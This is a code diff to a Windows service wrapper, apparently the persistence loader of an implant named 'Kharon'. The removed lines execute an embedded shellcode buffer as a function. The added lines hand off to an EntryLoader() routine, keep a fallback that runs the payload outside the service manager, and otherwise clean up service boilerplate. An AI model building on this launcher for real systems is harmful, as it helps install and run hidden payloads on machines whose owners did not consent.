@@ -1,10 +1,9 @@
 #include <Kharon.h>
-#include <Shellcode.h>
 
-SERVICE_STATUS ServiceStatus = {0};
-SERVICE_STATUS_HANDLE ServiceStatusHandle = NULL;
+SERVICE_STATUS              ServiceStatus       = {0};
+SERVICE_STATUS_HANDLE       ServiceStatusHandle = NULL;
 
-VOID WINAPI ServiceMain( ULONG argc, CHAR *argv );
+VOID WINAPI ServiceMain( DWORD argc, LPWSTR *argv );
 VOID WINAPI ServiceCtrlHandler( ULONG Ctrl );
 VOID RunKharon( VOID );
 
@@ -23,35 +22,30 @@ VOID WINAPI ServiceCtrlHandler( ULONG Ctrl ) {
             break;
     }
 
-    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
+    SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
 }
 
-VOID RunKharon(VOID) {
-    VOID(*Kharon)(VOID) = (decltype(Kharon))Shellcode::Data;
-    
-    if ( Kharon ) {
-        Kharon();
-    }
+VOID RunKharon( VOID ) {
+    EntryLoader();
 }
 
-VOID WINAPI ServiceMain( ULONG argc, CHAR *argv ) {
-    ServiceStatusHandle = RegisterServiceCtrlHandler( TEXT("Kharon"), ServiceCtrlHandler );
+VOID WINAPI ServiceMain( DWORD argc, LPWSTR *argv ) {
+    ServiceStatusHandle = RegisterServiceCtrlHandlerW( L"Kharon", ServiceCtrlHandler );
 
-    if ( ! ServiceStatusHandle ) {
-        return;
-    }
+    if ( !ServiceStatusHandle ) return;
 
-    ServiceStatus.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
-    ServiceStatus.dwCurrentState     = SERVICE_START_PENDING;
-    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
-    ServiceStatus.dwWin32ExitCode    = 0;
+    ServiceStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
+    ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
+    ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    ServiceStatus.dwWin32ExitCode           = 0;
     ServiceStatus.dwServiceSpecificExitCode = 0;
-    ServiceStatus.dwCheckPoint       = 0;
-    ServiceStatus.dwWaitHint         = 0;
+    ServiceStatus.dwCheckPoint              = 0;
+    ServiceStatus.dwWaitHint                = 3000;
 
     SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
 
     ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+    ServiceStatus.dwWaitHint     = 0;
     SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
 
     RunKharon();
@@ -66,12 +60,11 @@ auto WINAPI WinMain(
     _In_ LPSTR     CommandLine,
     _In_ INT32     ShowCmd
 ) -> INT32 {
-    SERVICE_TABLE_ENTRY ServiceTable[] = { { TEXT("Kharon"), ServiceMain }, { nullptr, nullptr } };
+    SERVICE_TABLE_ENTRYW ServiceTable[] = { { (LPWSTR)L"Kharon", ServiceMain }, { nullptr, nullptr } };
 
-    if ( ! StartServiceCtrlDispatcher( ServiceTable ) ) {
+    if ( !StartServiceCtrlDispatcherW( ServiceTable ) ) {
         RunKharon();
     }
 
     return 0;
 }
-
